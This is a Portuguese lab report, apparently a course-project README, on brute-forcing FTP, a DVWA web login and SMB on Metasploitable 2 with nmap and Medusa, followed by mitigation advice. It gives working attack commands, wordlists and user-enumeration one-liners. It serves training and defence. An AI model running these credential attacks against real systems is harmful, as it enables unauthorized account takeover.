# Relatório de Simulação de Ataque de Força Bruta (Brute Force)

## 1. Introdução

Este repositório documenta a execução de um projeto prático de cibersegurança, focado na simulação de ataques de força bruta em um ambiente de laboratório controlado. O objetivo é demonstrar a compreensão das técnicas de ataque, o uso de ferramentas, como **Kali Linux** e **Medusa**, e a capacidade de propor medidas de mitigação eficazes.

O cenário simula uma auditoria de segurança em sistemas legados, onde foram identificados três vetores de ataque potenciais: um servidor FTP, um painel de login web e um compartilhamento de arquivos via SMB.

* **Ambiente:** VirtualBox, Kali Linux (máquina do atacante), Metasploitable 2 (máquina alvo).
* **Ferramentas Principais:** `nmap`, `medusa`, `ftp`, `smbclient`.

## 2. Configuração do Ambiente (Laboratório)

A base de qualquer teste de segurança é um ambiente isolado e controlado para garantir que as atividades não afetem redes de produção.

1.  **Instalação do Software:**
    * Instale o [Oracle VM VirtualBox](https://www.virtualbox.org/).
    * Faça o download e configure a VM do [Kali Linux](https://www.kali.org/get-kali/#kali-virtual-machines).
    * Faça o download e configure a VM do [Metasploitable 2](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/).

2.  **Configuração da Rede:**
    * No VirtualBox, vá em `Arquivo -> Ferramentas -> Gerenciador de Rede`. Se necessário, crie uma nova rede. Isso garantirá que suas VMs se comuniquem entre si, mas fiquem isoladas do seu computador hospedeiro e da internet.
    * Nas configurações de ambas as VMs (Kali e Metasploitable 2), vá para a seção `Rede` e altere o `Conectado a:` para `Placa de Rede exclusiva de hospedeiro (Host-Only)`, selecionando a rede que você acabou de criar.

3.  **Verificação de Conectividade:**
    * Inicie as duas VMs.
    * No Kali Linux, descubra o IP da máquina Metasploitable 2.
        ```bash
        # Descobrir o seu bloco de rede (ex: 192.168.56.0/24)
        $ ip a

        # Escanear a rede para encontrar o host alvo
        $ sudo nmap -sn 192.168.56.0/24
        ```
    * Use o comando `ping <IP_DO_METASPLOITABLE>` para confirmar a comunicação.

## 3. Reconhecimento

Antes de qualquer ataque, um Pentester profissional realiza o reconhecimento para mapear a superfície de ataque. Vamos escanear o alvo para identificar serviços vulneráveis.

```bash
# Comando para escanear as portas e serviços mais comuns, tentando identificar a versão
$ sudo nmap -sV -p- <IP_DO_METASPLOITABLE>
```

**Resultado Esperado (Exemplo):**
O Nmap revelará diversas portas abertas. Para este desafio, nosso foco será:
* `Porta 21/tcp`: serviço **FTP** (vsftpd 2.3.4)
* `Porta 80/tcp`: serviço **HTTP** (Apache httpd 2.2.8)
* `Porta 445/tcp`: serviço **microsoft-ds** (Samba smbd 3.X)

## 4. Execução dos Ataques Simulados

Com os alvos identificados, iniciaremos os ataques de força bruta usando o Medusa.

### Cenário A: Ataque de Força Bruta ao Serviço FTP

**Objetivo:** obter acesso ao servidor FTP, que pode conter arquivos de configuração ou dados sensíveis.

1.  **Criação das Wordlists:**
    crie arquivos de texto simples para usuários e senhas. Para sistemas legados, é comum encontrar credenciais padrão.
    * `$ echo -e 'admin\nmsfadmin\nuser\nroot' > ftp_users.txt`
    * `$ cat ftp_users.txt`
        ```
        admin
        msfadmin
        user
        root
        ```
    * `$ echo -e '123456\npassword\nroot\ntoor\nmsfadmin' > ftp_passes.txt`
    * `$ cat ftp_passes.txt`
        ```
        123456
        password
        root
        toor
        msfadmin
        ```
2.  **Comando Medusa:**
    ```bash
    $ medusa -h <IP_DO_METASPLOITABLE> -U ftp_users.txt -P ftp_passes.txt -M ftp
    ```
    * `-h`: host (o IP do alvo).
    * `-U`: arquivo com a lista de usuários.
    * `-P`: arquivo com a lista de senhas.
    * `-M`: módulo do serviço a ser atacado (neste caso, `ftp`).

3.  **Resultados e Validação:**
    O Medusa indicará o sucesso ao encontrar uma combinação válida.
    ```
    ACCOUNT FOUND: [ftp] Host: <IP_DO_METASPLOITABLE> User: msfadmin Password: msfadmin [SUCCESS]
    ```
    Para validar, conecte-se ao serviço FTP com as credenciais encontradas:
    ```bash
    $ ftp <IP_DO_METASPLOITABLE>
    Connected to <IP_DO_METASPLOITABLE>.
    220 (vsFTPd 2.3.4)
    Name (<IP_DO_METASPLOITABLE>:kali): msfadmin
    331 Please specify the password.
    Password:
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> ls
    ```

### Cenário B: Ataque de Força Bruta a Formulário Web (DVWA)

**Objetivo:** Comprometer uma conta de usuário através da página de login do *Damn Vulnerable Web Application (DVWA)*.

1.  **Preparação:**
    * Acesse `http://<IP_DO_METASPLOITABLE>/dvwa` em seu navegador no Kali.
    * Inspecione a página.

2.  **Comando Medusa:**
    O Medusa possui um módulo genérico para formulários web. Precisamos informar os parâmetros do formulário de login do DVWA.
    ```bash
    $ medusa -h <IP_DO_METASPLOITABLE> -U ftp_users.txt -P ftp_passes.txt -M http -m PAGE:'/dvwa/login.php' -m FORM:'username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' -t 6
    ```
    * `-U ftp_users.txt`: wordlist dos usuários.
    * `-P ftp_passes.txt`: wordlist das senhas.
    * `-M http`: protocolo web.
    * `-m PAGE`: URI da página de login.
    * `-m FORM:"username=...&password=..."`: Define os nomes dos campos do formulário. `^USER^` e `^PASS^` são placeholders que o Medusa substitui.
    * `-m 'FAIL=Login failed'`: texto que aparece na página quando uma tentativa é mal sucedida.
    * `-t 6`: define o número de tarefas paralelas (conexões simultâneas) que o Medusa usará.

3.  **Resultado e validação:**
    o Medusa encontrará a senha `password` para o usuário `admin`. A saída terá duas linhas semelhantes a:
    ```bash
    ...
    ACCOUNT CHECK: [http] Host: <IP_DO_METASPLOITABLE> (1 of 1, 0 complete) User: admin (1 of 4, 1 complete) Password: password (1 of 5 complete)
    ACCOUNT FOUND: [http] Host: <IP_DO_METASPLOITABLE> User: admin Password: password [SUCCESS]
    ...
    ```
    Acesse a página do DVWA e utilize as credenciais verificadas para validar o processo do ataque.

### Cenário C: Password Spraying no Serviço SMB

**Objetivo:** identificar uma conta válida no serviço SMB usando uma senha comum. Esta técnica é mais discreta que o brute force tradicional, pois evita o bloqueio de contas ao testar uma única senha contra múltiplos usuários.

1.  **Enumeração de Usuários:**
    primeiro, precisamos de uma lista de usuários válidos no sistema e de uma lista de senhas a serem testadas. O script `smb-enum-users` do Nmap pode ser utilizado para criar a lista de usuários.
    ```bash
    $ nmap --script smb-enum-users.nse -p445 <IP_DO_METASPLOITABLE> | grep 'METASPLOITABLE\\' | cut -d'\' -f2 | cut -d' ' -f1 > smb_users.txt
    ```
    * O resultado da execução do script será uma lista de usuários salva no arquivo `smb_users.txt`, como `msfadmin`, `user`, `service`, etc. Verifique o arquivo criado.
    Em seguida, iremos criar o arquivo contendo a lista de senhas (semelhante ao que já foi feito anteriormente).
    ```bash
    $ echo -e 'root\ntoor\npassword\nroot\nWelcome123\nmsfadmin' > senhas_spray.txt
    ```
2.  **Executando o Password Spraying:**
    agora podemos testar as senhas inseridas no arquivo `senhas_spray.txt`, contra todos os usuários encontrados no arquivo `smb_users.txt`.
    ```bash
    $ medusa -h <IP_DO_METASPLOITABLE> -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2
    ```
    * `-U smb_users.txt`: nossa lista de usuários enumerados.
    * `-P senhas_spray.txt`: nossa lista de senhas iremos "borrifar" (spraying).
    * `-M smbnt`: módulo para o protocolo SMB.
    * `-t 2`: define o número de tarefas paralelas (testes simultâneos) que o Medusa usará.

3.  **Resultados e Validação:**
    o Medusa encontrará as credenciais `msfadmin`:`msfadmin`. A saída terá uma linha semelhante a:
    ```bash
    ...
    CCOUNT FOUND: [smbnt] Host: <IP_DO_METASPLOITABLE> User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
    ...
    ```
    Valide o acesso usando o `smbclient`:
    ```bash
    $ smbclient -L //<IP_DO_METASPLOITABLE> -U msfadmin
    Password for [WORKGROUP\msfadmin]:
    ```
    ```bash
    Sharename       Type      Comment
    ---------       ----      -------
    print$          Disk      Printer Drivers
    tmp             Disk      oh noes!
    opt             Disk      
    IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
    ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
    msfadmin        Disk      Home Directories

    Reconnecting with SMB1 for workgroup listing.

    Server               Comment
    ---------            -------

    Workgroup            Master
    ---------            -------
    WORKGROUP            METASPLOITABLE
    ```

## 5. Recomendações de Mitigação

A parte mais importante de um teste de penetração é fornecer recomendações claras para corrigir as vulnerabilidades encontradas.

* **Controle de Acesso e Senhas (Geral):**
    1.  **Política de Senhas Fortes:** exigir senhas com complexidade mínima (maiúsculas, minúsculas, números, símbolos) e comprimento mínimo de 12 caracteres.
    2.  **Bloqueio de Contas (Account Lockout):** implementar uma política que bloqueie temporariamente uma conta após um número definido de tentativas de login malsucedidas (por exemplo, 5 tentativas em 15 minutos).
    3.  **Autenticação de Múltiplos Fatores (MFA):** implementar MFA em todos os serviços críticos, especialmente em painéis de login web.

* **Mitigação Específica por Serviço:**
    * **FTP:**
        * **Desativar:** se não for essencial para o negócio, desative o serviço FTP.
        * **Usar Protocolos Seguros:** substituir FTP por SFTP (SSH File Transfer Protocol) ou FTPS (FTP over SSL/TLS).
        * **Firewall/Fail2Ban:** implementar ferramentas como o Fail2Ban para banir automaticamente os IPs que geram múltiplas falhas de autenticação.
    * **Aplicações Web (DVWA):**
        * **CAPTCHA:** utilizar CAPTCHA em formulários de login para impedir ataques automatizados.
        * **Monitoramento e Alertas:** monitorar os logs do servidor web para detectar um volume anormal de tentativas de login a partir do mesmo IP ou contra o mesmo usuário.
    * **SMB:**
        * **Segmentação de Rede:** restringir o acesso ao serviço SMB apenas a hosts autorizados na rede interna.
        * **Princípio do Menor Privilégio:** garantir que as contas de serviço e usuários tenham apenas as permissões estritamente necessárias.
        * **Auditoria Regular:** realizar auditorias periódicas para remover contas de usuários inativas ou desnecessárias.

## 6. Conclusão

Estes cenários demonstram como vulnerabilidades de autenticação em diferentes serviços podem ser exploradas por meio de ataques de força bruta e password spraying. A utilização de ferramentas como Nmap e Medusa em um ambiente controlado permitem não apenas validar as falhas, mas também compreender a importância fundamental de uma defesa em camadas.

A segurança eficaz não reside apenas em firewalls, mas em políticas robustas de senhas, monitoramento contínuo e na aplicação do princípio do menor privilégio. Este projeto é como um portfólio prático para o desenvolvimento da capacidade de identificar, explorar e mitigar riscos de segurança cibernética.
